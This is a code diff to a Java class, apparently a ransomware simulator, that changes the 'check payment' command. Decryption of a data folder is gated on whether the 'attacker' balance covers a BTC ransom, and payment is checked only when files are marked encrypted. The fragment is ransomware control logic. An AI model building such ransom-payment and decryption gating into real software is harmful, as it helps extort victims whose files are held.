@@ -147,24 +147,31 @@ public class MainClass {
             }
 
             if (input.equals("check payment")) {
-                this.runner.stop();
-                System.out.println(this.attacker.getBalance());
-                if (this.attacker.getBalance()>=this.runner.getBTC()) {
-                    try {
-                        Method method = this.encryption.getClass().getMethod("decrypt",String.class);
-                        String filePath = "data\\";
-                        method.invoke(this.encryption,filePath);
-                        System.out.println("Your files are no decrypted!");
-                        break;
-                    } catch (Exception e) {
-                        System.out.println("too bad");
+                if (isencrypted) {
+                    this.runner.stop();
+                    System.out.println(this.attacker.getBalance());
+                    if (this.attacker.getBalance()>=this.runner.getBTC()) {
+                        try {
+                            Method method = this.encryption.getClass().getMethod("decrypt",String.class);
+                            String filePath = "data\\";
+                            method.invoke(this.encryption,filePath);
+                            System.out.println("Your files are no decrypted!");
+                            break;
+                        } catch (Exception e) {
+                            System.out.println("too bad");
+                        }
+
+                    } else {
+                        System.out.println("Not enough paid");
+                        this.runner.run();
                     }
 
                 } else {
-                    System.out.println("Not enough paid");
-                    this.runner.run();
+                    System.out.println("No need to check the payment");
+                    System.out.println();
                 }
                 continue;
+
             }
 
             if (input.contains("pay ")) {
